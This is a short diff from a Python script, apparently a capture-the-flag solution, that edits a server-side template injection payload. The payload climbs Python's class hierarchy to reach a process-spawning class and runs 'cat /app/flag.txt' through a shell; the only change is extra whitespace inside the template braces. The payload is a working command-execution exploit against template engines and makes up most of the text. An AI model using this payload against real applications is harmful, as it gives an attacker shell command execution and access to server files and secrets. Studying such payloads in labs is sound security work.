@@ -169,7 +169,7 @@ def shout():
 import random
 import requests
 
-payload = "{{''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate()}}"
+payload = "{{ ''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate() }}"
 chars = [chr(x) for x in range(25,128)] # string.ascii_letters + string.digits
 chars = chars[:len(payload)]
 print(payload, len(payload), len(chars))
